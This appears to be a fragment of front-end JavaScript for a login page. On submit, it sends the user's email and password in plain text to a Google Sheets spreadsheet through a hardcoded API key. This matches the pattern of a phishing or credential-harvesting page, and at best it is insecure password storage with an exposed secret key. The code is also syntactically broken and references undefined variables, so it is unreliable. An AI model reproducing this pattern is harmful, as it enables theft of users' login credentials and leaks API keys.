    document.getElementById("loginForm").addEventListener("submit", function(event) {

      var apiKey = "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc";

      var range = "Sheet1!A1:B"; // Cập nhật phạm vi với tên sheet của bạn

      var url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=RAW&key=${apiKey}`;
      
      var data = {
        values: [
          [email, password]

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data)
      })
